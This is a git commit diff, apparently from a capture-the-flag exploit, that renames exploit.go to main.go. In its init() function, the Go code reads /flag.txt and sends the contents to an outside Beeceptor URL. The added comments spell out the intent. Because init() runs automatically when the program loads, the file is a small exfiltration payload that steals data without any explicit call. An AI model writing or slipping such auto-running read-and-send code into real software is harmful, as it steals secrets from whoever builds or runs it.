16deb8380f3c2e3864951249b1d865a5f0603f22
Anas Ibrahim <78263620+Anas0x1@users.noreply.github.com>
2025-08-10 19:47:17 +0200

    Update and rename exploit.go to main.go

--- main.go
+++ main.go
@@ -1,4 +1,4 @@
-package gogeta
+package main
 
 import (
     "io/ioutil"
@@ -6,6 +6,10 @@ import (
 )
 
 func init() {
+    // Read the flag
     data, _ := ioutil.ReadFile("/flag.txt")
+    // Send it to your Beeceptor endpoint
     http.Get("https://anas0x1.free.beeceptor.com/?flag=" + string(data))
 }
+
+func main() {}
